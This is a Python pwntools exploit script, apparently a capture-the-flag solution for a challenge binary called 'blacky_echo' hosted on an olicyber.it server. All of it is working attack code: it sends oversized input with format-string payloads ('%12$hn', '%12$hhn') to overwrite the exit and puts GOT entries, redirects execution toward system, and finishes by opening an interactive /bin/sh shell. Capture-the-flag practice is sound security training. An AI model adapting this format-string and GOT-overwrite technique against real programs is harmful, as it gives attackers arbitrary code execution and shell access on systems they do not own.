#!/usr/bin/env python3

from pwn import *

elf = ELF("./blacky_echo_patched")
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = elf

context.terminal = ()
def conn():
    if args.REMOTE:
        p = remote("blacky-echo.challs.olicyber.it" ,11002)
    elif args.GDB:
        p = gdb.debug([elf.path], ''' 
        b go
        c
        b *0x400b3e
        c
        b *0x400b4f
        jump *0x400b4f
                
      ''')
    else:
        p = process([elf.path])

    return p


def main():
    p = conn()

    p.sendlineafter(b"Size: ", b'65573')
    

    go_addr =  (int("400b54",16)) & 0xffff

    payl = f"%{go_addr-21}c%12$hn"
  
    p.sendafter(b'Input: ', b'a'*65536 + b'Format err' + payl.encode() + b'a'*7  + p64(elf.got['exit']) )
 
    sys_addr = elf.got['system'] - 7

    p.sendlineafter(b"Size: ", b'65577' )
    p.sendlineafter(b"Size: ", b'65577' )
    payl = f'%{sys_addr & 0xffffff}c%12$hhn'

    p.sendlineafter(b'Input: ', b'a'*65536 + b'Format err' + payl.encode() + b'a'*3  + p64(elf.got['puts']) )

    p.sendlineafter(b"Size: ", b'14' )
    p.sendlineafter(b'Input: ', b'ECHO->' + b'/bin/sh')


    p.interactive()


if __name__ == "__main__":
    main()
